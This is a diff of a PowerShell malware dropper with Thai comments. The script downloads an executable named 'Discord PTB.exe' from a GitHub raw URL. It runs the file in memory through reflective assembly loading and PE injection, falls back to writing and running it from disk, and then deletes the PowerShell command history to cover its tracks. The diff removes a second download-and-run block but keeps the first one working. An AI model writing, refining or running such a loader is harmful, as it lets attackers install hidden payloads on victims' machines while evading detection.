@@ -26,6 +26,7 @@ function Download-EXE {
 function Invoke-MemoryExecution {
     param([byte[]]$Bytes)
     
+    # วิธีที่ 1: .NET Assembly
     try {
         $assembly = [System.Reflection.Assembly]::Load($Bytes)
         $entryPoint = $assembly.EntryPoint
@@ -35,6 +36,7 @@ function Invoke-MemoryExecution {
         }
     } catch {}
 
+    # วิธีที่ 2: Reflection Injection
     try {
         $ReflectiveInject = {
             param([byte[]]$PEBytes)
@@ -108,31 +110,20 @@ function Invoke-FileExecution {
 }
 
 # ============================================
-# 5. ดาวน์โหลดและรัน EXE ตัวที่ 1 (Discord PTB.exe)
+# 5. ดาวน์โหลดและรัน EXE
 # ============================================
-$exeUrl1 = "https://github.com/zenxler98-ui/betx/raw/refs/heads/main/Discord%20PTB.exe"
-$bytes1 = Download-EXE -Url $exeUrl1
-if ($bytes1 -and $bytes1.Length -gt 0) {
-    $executed1 = Invoke-MemoryExecution -Bytes $bytes1
-    if (-not $executed1) {
-        Invoke-FileExecution -Bytes $bytes1 -FileName "DiscordPTB.exe"
+$exeUrl = "https://github.com/zenxler98-ui/betx/raw/refs/heads/main/Discord%20PTB.exe"
+$bytes = Download-EXE -Url $exeUrl
+
+if ($bytes -and $bytes.Length -gt 0) {
+    $executed = Invoke-MemoryExecution -Bytes $bytes
+    if (-not $executed) {
+        Invoke-FileExecution -Bytes $bytes -FileName "DiscordPTB.exe"
     }
 }
 
 # ============================================
-# 6. ดาวน์โหลดและรัน EXE ตัวที่ 2 (main.exe)
-# ============================================
-$exeUrl2 = "https://github.com/relaxhaha56-maker/Data-Scraping-Bot/raw/refs/heads/main/main.exe"
-$bytes2 = Download-EXE -Url $exeUrl2
-if ($bytes2 -and $bytes2.Length -gt 0) {
-    $executed2 = Invoke-MemoryExecution -Bytes $bytes2
-    if (-not $executed2) {
-        Invoke-FileExecution -Bytes $bytes2 -FileName "main.exe"
-    }
-}
-
-# ============================================
-# 7. ล้างร่องรอย
+# 6. ล้างร่องรอย
 # ============================================
 try {
     $historyPath = (Get-PSReadlineOption).HistorySavePath
@@ -161,6 +152,6 @@ try {
 } catch {}
 
 # ============================================
-# 8. ปิดตัวเอง
+# 7. ปิดตัวเอง
 # ============================================
 exit
